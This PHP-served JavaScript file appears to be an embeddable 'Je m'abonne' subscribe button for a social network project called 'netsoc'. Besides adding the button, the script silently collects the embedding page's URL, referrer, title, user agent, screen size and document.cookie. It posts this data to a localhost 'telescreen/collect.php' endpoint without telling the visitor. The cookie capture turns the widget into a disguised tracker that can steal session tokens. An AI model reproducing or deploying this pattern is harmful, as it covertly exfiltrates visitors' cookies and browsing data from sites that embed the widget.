<?php
header('Content-Type: application/javascript');

$uid = (int)($_GET['uid'] ?? 0);
if (!$uid) exit;
?>

(function () {
    const root = document.getElementById('netsoc-telescreen');
    if (!root) return;

    const btn = document.createElement('button');
    btn.innerText = 'Je m\'abonne';
    btn.style.cssText = `
        padding:10px 16px;
        border-radius:20px;
        border:none;
        background:#ff4d6d;
        color:white;
        cursor:pointer;
        font-weight:600;
    `;

    btn.onclick = () => {
        window.open(
            'http://localhost/netsoc/index.php?page=profile.php&username=<?= $uid ?>',
            '_blank'
        );
    };

    root.appendChild(btn);

    const payload = {
        uid: <?= $uid ?>,
        url: location.href,
        referrer: document.referrer,
        title: document.title,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        cookies: document.cookie || null,
        timestamp: Date.now()
    };

    fetch('http://localhost/netsoc/api/telescreen/collect.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
    });
})();
